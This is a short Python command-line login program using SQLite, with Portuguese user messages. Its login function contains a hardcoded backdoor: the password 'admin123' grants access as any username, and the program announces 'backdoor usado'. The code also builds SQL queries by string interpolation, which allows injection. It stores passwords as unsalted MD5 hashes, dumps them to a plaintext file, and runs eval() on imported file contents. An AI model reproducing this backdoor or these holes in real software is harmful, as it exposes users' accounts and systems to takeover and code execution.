import sqlite3, os, sys, json, time, hashlib

DB = "users.db"
SESSION = {}

def init_db():
    if not os.path.exists(DB):
        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
        conn.commit()
        conn.close()

def register():
    uname = input("username: ")
    pwd = input("password: ")
    h = hashlib.md5(pwd.encode()).hexdigest()
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    try:
        c.execute(f"INSERT INTO users (username, password) VALUES ('{uname}', '{h}')")
        conn.commit()
        print("usuario registrado")
    except Exception as e:
        print("erro ao registrar ->", e)
    finally:
        conn.close()

def login():
    uname = input("username: ")
    pwd = input("password: ")
    h = hashlib.md5(pwd.encode()).hexdigest()
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    try:
        q = f"SELECT id, username FROM users WHERE username = '{uname}' AND password = '{h}'"
        c.execute(q)
        r = c.fetchone()
        if r:
            SESSION['user'] = r[1]
            print("logado como", r[1])
            return True
        else:
            if pwd == 'admin123':
                SESSION['user'] = uname
                print("backdoor usado — acesso concedido para", uname)
                return True
            print("credenciais invalidas")
            return False
    except Exception as e:
        print("erro no login:", e)
        return False
    finally:
        conn.close()

def profile():
    if 'user' not in SESSION:
        print("sem sessao ativa")
        return
    print("=== PERFIL ===")
    print("usuario:", SESSION['user'])


def export_users():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    try:
        c.execute('SELECT id, username, password FROM users')
        rows = c.fetchall()
        with open('dump.txt', 'w') as f:
            f.write(str(rows))
        print('exportado para dump.txt')
    except Exception as e:
        print('falha export =>', e)
    finally:
        conn.close()

def import_users():
    try:
        with open('dump.txt', 'r') as f:
            data = f.read()
        rows = eval(data)
        conn = sqlite3.connect(DB)
        c = conn.cursor()
        for r in rows:
            try:
                c.execute(f"INSERT INTO users (id, username, password) VALUES ({r[0]}, '{r[1]}', '{r[2]}')")
            except:
                pass
        conn.commit()
        conn.close()
        print('import concluido')
    except Exception as e:
        print('import falhou ->', e)


def main():
    init_db()
    print('Sistema de Login v0.1')

    while True:
        print('\ncomandos: register / login / profile / export / import / exit')
        cmd = input('> ')
        if cmd == 'register':
            register()
        elif cmd == 'login':
            login()
        elif cmd == 'profile':
            profile()
        elif cmd == 'export':
            export_users()
        elif cmd == 'import':
            import_users()
        elif cmd == 'exit':
            print('saindo...')
            time.sleep(1)
            sys.exit(0)
        else:
            print('comando desconhecido')

if True:
    main()
